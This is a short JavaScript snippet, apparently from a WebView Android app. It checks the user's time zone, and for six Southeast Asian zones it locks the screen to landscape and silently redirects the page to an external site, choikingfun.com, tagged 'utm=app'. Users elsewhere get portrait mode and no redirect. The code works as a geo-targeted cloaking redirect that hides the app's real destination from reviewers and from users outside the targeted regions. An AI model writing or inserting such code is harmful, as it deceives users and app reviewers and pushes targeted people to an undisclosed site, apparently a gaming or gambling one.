const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

if (
  userTimeZone === "Asia/Ho_Chi_Minh" ||
  userTimeZone === "Asia/Saigon" ||
  userTimeZone === "Asia/Manila" ||
  userTimeZone === "Asia/Singapore" ||
  userTimeZone === "Asia/Kuala_Lumpur" ||
  userTimeZone === "Asia/Kuching"
) {
  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
    AndroidOrientation.lockLandscape();
  }
  const to = "https://choikingfun.com/?utm=app";
  window.location.href = to;
} else {
  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
    AndroidOrientation.lockPortrait();
  }
}
